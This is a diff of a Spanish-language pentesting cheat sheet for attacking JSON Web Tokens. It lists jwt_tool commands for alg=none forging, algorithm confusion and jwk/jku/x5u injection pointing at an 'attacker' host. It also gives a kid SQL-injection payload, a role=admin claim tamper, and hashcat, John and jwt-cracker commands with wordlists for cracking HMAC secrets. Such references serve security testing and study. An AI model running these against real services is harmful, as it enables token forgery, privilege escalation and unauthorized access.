@@ -25,91 +25,96 @@ linked:
 
 ## jwt_tool (All-in-One)
 
-| **Objetivo** | **Comando** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Instalación | `git clone https://github.com/ticarpi/jwt_tool && cd jwt_tool && pip install -r requirements.txt` | Python 3. |
-| Decode + análisis | `python3 jwt_tool.py <token>` | Sin args = decode + heuristics. |
-| Tampering interactivo | `python3 jwt_tool.py <token> -T` | Modifica claims interactively + re-firma. |
-| Probe automático | `python3 jwt_tool.py <token> -M pb -t https://target/api -rh "Authorization: Bearer <token>"` | Playbook automático: alg=none + null sig + alg confusion. |
-| alg=none forge | `python3 jwt_tool.py <token> -X a` | Genera variantes none/None/NONE/nOnE. |
-| Algorithm confusion | `python3 jwt_tool.py <token> -X k -pk public.pem` | RS256 → HS256 con pública. |
-| jwk header inject | `python3 jwt_tool.py <token> -X i` | Auto-genera par RSA + inyecta jwk. |
-| jku header inject | `python3 jwt_tool.py <token> -X s -ju http://attacker/jwks.json -pk priv.pem` | Atacante hostea JWKS. |
-| x5u inject | `python3 jwt_tool.py <token> -X s -ku http://attacker/cert.pem` | Cert chain. |
-| kid SQLi inject | `python3 jwt_tool.py <token> -I -hc kid -hv "x' UNION SELECT 'AAA' -- "` | Modifica header `kid`. |
-| Crack secret | `python3 jwt_tool.py <token> -C -d wordlist.txt` | Bruteforce HS256. |
-| Forzar alg específico | `python3 jwt_tool.py <token> -S hs256 -p "secret"` | Re-firmar con alg + secret dado. |
-| Crear nuevo desde cero | `python3 jwt_tool.py -Q <preset>` | Templates: oauth, oidc, custom. |
+| `git clone https://github.com/ticarpi/jwt_tool && cd jwt_tool && pip install -r requirements.txt` | Install jwt_tool | Primera vez. |
+| `python3 jwt_tool.py $JWT` | Decode + heuristics warnings | Quick recon. |
+| `python3 jwt_tool.py $JWT -T` | Tamper interactivo (modify claims + resign) | Manual exploration. |
+| `python3 jwt_tool.py $JWT -M pb -t https://target/api -rh "Authorization: Bearer $JWT"` | Playbook automático completo | Bulk vuln scan. |
+| `python3 jwt_tool.py $JWT -X a` | Auto-genera variantes alg=none | Test alg=none. |
+| `python3 jwt_tool.py $JWT -X k -pk public.pem` | RS256 → HS256 confusion | Alg confusion attack. |
+| `python3 jwt_tool.py $JWT -X i` | Auto-genera par + inyecta jwk en header | jwk header inject. |
+| `python3 jwt_tool.py $JWT -X s -ju http://attacker/jwks.json -pk priv.pem` | Forge con jku malicioso | jku header inject. |
+| `python3 jwt_tool.py $JWT -X s -ku http://attacker/cert.pem` | Forge con x5u malicioso | x5u header inject. |
+| `python3 jwt_tool.py $JWT -I -hc kid -hv "x' UNION SELECT 'AAA' -- "` | kid SQLi inject | Backend usa kid en SQL. |
+| `python3 jwt_tool.py $JWT -I -pc role -pv admin` | Modificar claim role + resign | Quick claim tamper. |
+| `python3 jwt_tool.py $JWT -C -d /usr/share/wordlists/rockyou.txt` | Bruteforce HS256 secret | Quick crack check. |
+| `python3 jwt_tool.py $JWT -S hs256 -p "weaksecret"` | Re-firmar con secret conocido | Post-crack regen. |
 ^jwt-tool-jwttool
 
-### Flags clave
+### Flags clave (referencia)
 
 | Flag | Función |
 |---|---|
 | `-T` | Tamper interactivo |
 | `-M pb` | Modo playbook (probe completo) |
-| `-X <a/k/i/s>` | Exploit auto: alg-none / alg-confusion / inject-jwk / inject-jku-x5u |
-| `-I` | Modificar headers |
-| `-C` | Crack mode |
-| `-d` | Diccionario para crack |
-| `-S <alg>` | Re-firmar con algoritmo |
-| `-p <secret>` | Secret HMAC |
-| `-pk <file>` | Clave privada (RS256/ES256) |
-| `-rh` | Headers extra al hacer requests |
+| `-X a/k/i/s` | Exploit auto: alg-none / alg-confusion / inject-jwk / inject-jku-x5u |
+| `-I -hc <key> -hv <val>` | Modificar header claim |
+| `-I -pc <key> -pv <val>` | Modificar payload claim |
+| `-C -d <wordlist>` | Crack secret HMAC |
+| `-S <alg> -p <secret>` | Re-firmar con alg + secret |
+| `-pk <file>` | Privkey para RS256/ES256 |
+| `-rh "Header: value"` | Headers extra para requests |
 
 ___
 
 ## Hashcat HS256
 
-| **Objetivo** | **Comando** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Modo JWT | `-m 16500` | HMAC-SHA256 (JWT). |
-| Bruteforce dictionary | `hashcat -m 16500 token.txt rockyou.txt` | Wordlist clásica. |
-| Con rules | `hashcat -m 16500 token.txt rockyou.txt -r best64.rule` | Mutaciones aplicadas. |
-| Mask attack | `hashcat -m 16500 -a 3 token.txt ?l?l?l?l?l?l?l?l` | 8 chars lowercase. |
-| Mask alfanumérico | `hashcat -m 16500 -a 3 token.txt ?a?a?a?a?a?a?a?a` | Charset completo (~95 chars). |
-| Combinator attack | `hashcat -m 16500 -a 1 token.txt list1.txt list2.txt` | Concat de wordlists. |
-| Hybrid mask + dict | `hashcat -m 16500 -a 6 token.txt rockyou.txt ?d?d?d?d` | Wordlist + 4 dígitos. |
-| Resume | `hashcat --restore` | Continuar interrumpido. |
-| Show cracked | `hashcat -m 16500 token.txt --show` | Ver resultado tras crack. |
-| GPU specs | `hashcat -b -m 16500` | Benchmark velocidad local. |
-| Potfile | `--potfile-path=jwt.pot` | Separar resultados. |
+| `echo -n $JWT > jwt.txt && hashcat -m 16500 jwt.txt rockyou.txt` | GPU brute con wordlist | Quick check secret común. |
+| `hashcat -m 16500 jwt.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule` | Wordlist + mutaciones | Cobertura ampliada. |
+| `hashcat -m 16500 jwt.txt rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule` | Rules más agresivas | Si best64 no resuelve. |
+| `hashcat -m 16500 -a 3 jwt.txt ?l?l?l?l?l?l?l?l` | Mask 8 chars lowercase | Sin wordlist. |
+| `hashcat -m 16500 -a 3 jwt.txt ?a?a?a?a?a?a` | Mask 6 chars charset full | Brute corto factible. |
+| `hashcat -m 16500 -a 6 jwt.txt rockyou.txt ?d?d?d?d` | Hybrid wordlist + 4 dígitos sufijo | Common pattern. |
+| `hashcat -m 16500 -a 1 jwt.txt list1.txt list2.txt` | Combinator de 2 wordlists | Compound passwords. |
+| `hashcat -b -m 16500` | Benchmark velocidad GPU local | Pre-attack planning. |
+| `hashcat -m 16500 jwt.txt --show` | Ver secret cracked previo | Resume / lookup. |
+| `hashcat --restore` | Continuar sesión interrumpida | Long runs. |
 ^jwt-tool-hashcat
 
 ### Wordlists recomendadas
 
 ```bash
-# JWT-specific (assetnote)
+# JWT-specific (wallarm)
 wget https://github.com/wallarm/jwt-secrets/raw/master/jwt.secrets.list
 
-# Defaults dev
-echo -e "secret\nsecretkey\nyoursecret\nsupersecret\njwt_secret\nchange_me" > defaults.txt
+# Defaults dev comunes
+cat <<EOF > defaults.txt
+secret
+secretkey
+yoursecret
+supersecret
+jwt_secret
+change_me
+ChangeMe
+default_secret
+test
+test123
+EOF
 
 # Combo
-cat defaults.txt rockyou.txt jwt.secrets.list > combo.txt
-sort -u combo.txt -o combo.txt
-hashcat -m 16500 token.txt combo.txt -r best64.rule
+cat defaults.txt /usr/share/wordlists/rockyou.txt jwt.secrets.list | sort -u > combo.txt
+hashcat -m 16500 jwt.txt combo.txt -r /usr/share/hashcat/rules/best64.rule
 ```
 
 ___
 
-## jwtcrack y John
+## jwtcrack y John the Ripper
 
-| **Objetivo** | **Comando** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| jwtcrack install | `git clone https://github.com/lmammino/jwt-cracker && cd jwt-cracker && npm install` | Node — bruteforce charset corto. |
-| jwtcrack run | `jwt-cracker -t <token> -a abcdefghijklmnopqrstuvwxyz -m 6` | Charset + max length. |
-| jwtcrack con dict | `jwt-cracker -t <token> -d wordlist.txt` | Wordlist mode. |
-| John format JWT | `john --wordlist=rockyou.txt token.txt --format=HMAC-SHA256` | CPU mode. |
-| John reglas | `john --wordlist=rockyou.txt --rules=Wordlist token.txt --format=HMAC-SHA256` | Mutaciones. |
-| John show | `john --show token.txt --format=HMAC-SHA256` | Ver resultado. |
-| Convertir a john format | `echo "$jwt" \| awk -F. '{print $1"."$2"#"$3}'` | Solo si john lo requiere — versiones modernas aceptan JWT crudo. |
-| Hash extraction | `python3 -c "h=open('jwt.txt').read().strip(); s=h.rsplit('.',1)[0]; print(f'{s}#{h.rsplit(\".\",1)[1]}')"` | Para john legacy. |
-| jwt2john.py | Script auxiliar | Si la versión de john no acepta JWT directo. |
-| jwt-cracker docker | `docker run -v $PWD:/data jwt-cracker -t <token> -d /data/words.txt` | Sin instalar dependencias. |
+| `git clone https://github.com/lmammino/jwt-cracker && cd jwt-cracker && npm install` | Install jwtcrack (Node) | Charset corto brute. |
+| `jwt-cracker -t $JWT -a abcdefghijklmnopqrstuvwxyz -m 6` | Brute charset specific, max length 6 | Secret corto sospechado. |
+| `jwt-cracker -t $JWT -d wordlist.txt` | Dict mode | Sin GPU. |
+| `john --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256 jwt.txt` | CPU brute con John | Sin GPU. |
+| `john --wordlist=rockyou.txt --rules=Wordlist --format=HMAC-SHA256 jwt.txt` | Con reglas mutaciones | Cobertura. |
+| `john --show --format=HMAC-SHA256 jwt.txt` | Ver resultado cracked | Post-run. |
+| `docker run -v $PWD:/data lmammino/jwt-cracker -t $JWT -d /data/words.txt` | Sin instalar deps | Containerized. |
 ^jwt-tool-jwtcrack
 
-### Comparación de tools
+### Comparación de tools (referencia)
 
 | Tool | Velocidad | Uso recomendado |
 |---|---|---|
